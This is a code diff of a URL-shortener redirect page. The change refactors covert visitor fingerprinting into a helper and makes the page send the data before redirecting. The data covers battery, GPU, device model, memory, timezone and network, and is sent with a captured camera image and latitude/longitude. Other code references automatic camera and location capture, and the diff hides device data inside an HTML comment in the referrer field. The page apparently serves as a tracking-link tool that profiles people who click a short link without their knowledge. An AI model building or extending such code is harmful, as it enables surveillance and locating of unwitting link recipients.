@@ -10,6 +10,7 @@ import { cn } from '../lib/utils';
 import { SocialIcon } from '../components/SocialIcon';
 import { UAParser } from 'ua-parser-js';
 import { uploadImage } from '../lib/imageUpload';
+import { collectRealVisitorTelemetry } from '../lib/deviceDetector';
 
 export default function Redirect({ shortCode }: { shortCode: string }) {
   const [error, setError] = useState<string | null>(null);
@@ -33,106 +34,25 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
   const [showWhiteScreen, setShowWhiteScreen] = useState(false);
   const videoRef = useRef<HTMLVideoElement>(null);
 
-  // Fast, Non-Blocking Analytics Helper
-  const logClick = (id: string, customIntel?: any) => {
+  // Real Hardware & Device Telemetry Logger
+  const logClick = async (id: string, customIntel?: any) => {
     try {
-      const parser = new UAParser();
-      const result = parser.getResult();
+      const tel = await collectRealVisitorTelemetry();
 
-      // Collect System Specs synchronously (0ms)
-      let batteryLevel: number | null = null;
-      let isCharging: boolean | null = null;
-      try {
-        if ('getBattery' in navigator) {
-          (navigator as any).getBattery().then((battery: any) => {
-            batteryLevel = battery.level;
-            isCharging = battery.charging;
-          }).catch(() => {});
-        }
-      } catch (e) {}
-
-      let webglVendor = 'Unknown';
-      let webglRenderer = 'Unknown';
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-          const debugInfo = (gl as WebGLRenderingContext).getExtension('WEBGL_debug_renderer_info');
-          if (debugInfo) {
-            webglVendor = (gl as WebGLRenderingContext).getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-            webglRenderer = (gl as WebGLRenderingContext).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-          }
-        }
-      } catch (err) {}
-
-      const networkType = (navigator as any).connection?.effectiveType || (navigator as any).connection?.type || 'Unknown';
-      const screenResolution = `${window.screen.width}×${window.screen.height}`;
-      const language = navigator.language;
-      const hardwareConcurrency = navigator.hardwareConcurrency || null;
-      const deviceMemory = (navigator as any).deviceMemory || null;
-      const colorDepth = window.screen.colorDepth || null;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-      const rawUserAgent = navigator.userAgent || '';
-      const touchPoints = typeof navigator.maxTouchPoints === 'number' ? navigator.maxTouchPoints : 0;
-
-      // Extract device vendor and model
-      let deviceModel = result.device.model || '';
-      let deviceVendor = result.device.vendor || '';
-      const osName = result.os.name || 'Unknown';
-      const osVersion = result.os.version || '';
-
-      // Pattern matching for specific models (Tecno, Infinix, Xiaomi, Samsung, etc.)
-      if (!deviceModel) {
-        const tecnoMatch = rawUserAgent.match(/\b(Tecno\s+[A-Za-z0-9\s+]+?)(?=[;\)])/i);
-        const infinixMatch = rawUserAgent.match(/\b(Infinix\s+[A-Za-z0-9\s+]+?)(?=[;\)])/i);
-        const redmiMatch = rawUserAgent.match(/\b(Redmi\s+[A-Za-z0-9\s+]+?)(?=[;\)])/i);
-        const samsungMatch = rawUserAgent.match(/\bSM-[A-Za-z0-9]+(?=[;\)])/i);
-        if (tecnoMatch) deviceModel = tecnoMatch[1].trim();
-        else if (infinixMatch) deviceModel = infinixMatch[1].trim();
-        else if (redmiMatch) deviceModel = redmiMatch[1].trim();
-        else if (samsungMatch) deviceModel = `Samsung ${samsungMatch[0]}`;
-      }
-
-      let fullDeviceModel = '';
-      if (deviceVendor && deviceModel) {
-        fullDeviceModel = deviceModel.toLowerCase().includes(deviceVendor.toLowerCase())
-          ? deviceModel
-          : `${deviceVendor} ${deviceModel}`;
-      } else if (deviceModel) {
-        fullDeviceModel = deviceModel;
-      } else if (osName.toLowerCase().includes('android')) {
-        fullDeviceModel = 'Android Device';
-      } else if (osName.toLowerCase().includes('ios')) {
-        fullDeviceModel = 'Apple iPhone';
-      } else if (osName.toLowerCase().includes('windows')) {
-        fullDeviceModel = 'Windows PC';
-      } else if (osName.toLowerCase().includes('mac')) {
-        fullDeviceModel = 'Apple Mac';
-      } else {
-        fullDeviceModel = 'Desktop PC';
-      }
-
-      const isMobile = result.device.type === 'mobile' || touchPoints > 0 || /android|iphone|ipad|ipod/i.test(rawUserAgent);
-      const isTablet = result.device.type === 'tablet' || /ipad|tablet/i.test(rawUserAgent);
-      const category = isTablet ? 'Tablet' : isMobile ? 'Mobile' : 'Desktop';
-      const formattedDeviceType = `${fullDeviceModel} (${category})`;
-      const formattedOs = osVersion ? `${osName} ${osVersion}` : osName;
-
-      // Pack metadata inside referrer tag for lossless fallback storage
       const metaPayload = JSON.stringify({
-        device_model: fullDeviceModel,
-        device_type: formattedDeviceType,
-        os_version: formattedOs,
-        touch_points: touchPoints,
-        user_agent: rawUserAgent,
-        hardware_concurrency: hardwareConcurrency,
+        device_model: tel.deviceModel,
+        device_type: tel.deviceType,
+        os_version: tel.osVersion,
+        touch_points: tel.touchPoints,
+        user_agent: tel.userAgent,
+        hardware_concurrency: tel.hardwareConcurrency,
+        gpu_chipset: tel.gpuChipset,
       });
 
-      const cleanReferrer = document.referrer || 'Direct';
+      const cleanReferrer = typeof document !== 'undefined' ? document.referrer || 'Direct' : 'Direct';
       const packedReferrer = `${cleanReferrer} <!--${metaPayload}-->`;
 
-      // Send telemetry in background with keepalive (never blocks redirection!)
-      fetch('/api/analytics', {
+      await fetch('/api/analytics', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -140,30 +60,31 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
           shortCode,
           ipAddress: 'Auto',
           locationName: 'Auto',
-          deviceType: formattedDeviceType,
-          browser: result.browser.name || 'Unknown',
-          os: formattedOs,
+          deviceType: tel.deviceType,
+          browser: tel.browser,
+          os: tel.os,
           referrer: packedReferrer,
           capturedImage: customIntel?.image || null,
           latitude: customIntel?.lat || null,
           longitude: customIntel?.lon || null,
-          batteryLevel,
-          isCharging,
-          networkType,
-          screenResolution,
-          language,
-          hardwareConcurrency,
-          deviceMemory,
-          colorDepth,
-          timezone,
-          webglVendor,
-          webglRenderer,
-          touchPoints,
-          deviceModel: fullDeviceModel,
-          userAgent: rawUserAgent,
+          batteryLevel: tel.batteryLevel,
+          isCharging: tel.isCharging,
+          networkType: tel.networkType,
+          screenResolution: tel.screenResolution,
+          language: tel.language,
+          hardwareConcurrency: tel.hardwareConcurrency,
+          deviceMemory: tel.deviceMemory,
+          colorDepth: tel.screenColorDepth,
+          timezone: tel.timezone,
+          webglVendor: tel.webglVendor,
+          webglRenderer: tel.webglRenderer,
+          touchPoints: tel.touchPoints,
+          deviceModel: tel.deviceModel,
+          userAgent: tel.userAgent,
+          gpuChipset: tel.gpuChipset,
         }),
         keepalive: true,
-      }).catch(() => {});
+      });
     } catch (err) {
       console.error("Log failed:", err);
     }
@@ -222,7 +143,7 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
     }
 
     // 3. Log in background and Redirect immediately
-    logClick(data.id, intel);
+    await logClick(data.id, intel);
     
     if (!(data.social_gate_title && data.social_gate_url)) {
       window.location.replace(data.long_url);
@@ -262,7 +183,7 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
         if (resolvedData.capture_camera || resolvedData.capture_location) {
           performAutoCapture(resolvedData);
         } else {
-          logClick(resolvedData.id);
+          await logClick(resolvedData.id);
           if (!(resolvedData.social_gate_title && resolvedData.social_gate_url)) {
             window.location.replace(resolvedData.long_url);
           } else {
@@ -319,8 +240,8 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
         } else if (data.capture_camera || data.capture_location) {
           performAutoCapture(data);
         } else {
-          // Instant redirection with background analytics
-          logClick(data.id);
+          // Send real visitor telemetry first, then redirect
+          await logClick(data.id);
           if (data.social_gate_title && data.social_gate_url) {
             setSocialGate({
               title: data.social_gate_title,
